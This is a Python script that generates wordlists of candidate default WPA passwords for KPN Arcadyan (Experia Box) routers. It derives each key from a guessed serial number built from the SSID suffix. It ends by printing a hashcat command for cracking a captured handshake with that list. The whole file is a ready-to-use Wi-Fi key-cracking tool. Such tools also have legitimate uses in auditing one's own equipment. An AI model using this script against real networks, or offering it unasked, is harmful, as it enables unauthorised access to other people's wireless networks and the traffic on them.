#!/usr/bin/env python3
"""KPN Arcadyan default WPA key generator.
Generates candidate wordlists for hashcat cracking.

Algorithm: WPA key = SHA1(serial_number)[:20].upper()
Serial format: CP + 10 hex chars (KPN Experia Box)
               SSID reveals last 6 hex of serial

Usage: python3 kpn_keygen.py <ssid_suffix> -o wordlist.txt
Example: python3 kpn_keygen.py 7124A6 -o kpn7124a6_wordlist.txt
"""

import hashlib, itertools, argparse, sys

HEX_CHARS = '0123456789ABCDEF'

def generate_wordlist(suffix: str, output: str, prefix: str = 'CP', unknown_len: int = 4):
    """Generate all possible WPA keys for given SSID suffix."""
    count = 0
    with open(output, 'w') as f:
        for combo in itertools.product(HEX_CHARS, repeat=unknown_len):
            unknown = ''.join(combo)
            serial = prefix + unknown + suffix.upper()
            wpa = hashlib.sha1(serial.encode()).hexdigest()[:20].upper()
            f.write(wpa + '\n')
            count += 1
    return count

def generate_single(serial: str, output: str = None):
    """Generate a single WPA key from full serial (e.g. H220N123355)."""
    wpa = hashlib.sha1(serial.encode()).hexdigest()[:20].upper()
    if output:
        with open(output, 'w') as f:
            f.write(wpa + '\n')
    return wpa

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='KPN Arcadyan WPA key generator')
    parser.add_argument('suffix', help='SSID suffix (e.g. 7124A6 for KPN7124A6) or full serial')
    parser.add_argument('-o', '--output', default='kpn_wordlist.txt', help='Output file')
    parser.add_argument('-p', '--prefix', default='CP', help='Serial prefix (default: CP)')
    parser.add_argument('-n', '--unknown', type=int, default=4, help='Unknown hex chars (default: 4)')
    parser.add_argument('-s', '--single', action='store_true', help='Single key mode (suffix IS full serial)')
    
    args = parser.parse_args()
    
    if args.single:
        key = generate_single(args.suffix, args.output)
        print(f'WPA key: {key}')
    else:
        count = generate_wordlist(args.suffix, args.output, args.prefix, args.unknown)
        print(f'Generated {count} candidates to {args.output}')
        print(f'Crack: hashcat -a 0 -m 22000 hashes.22000 {args.output} -d 1 -w 3')
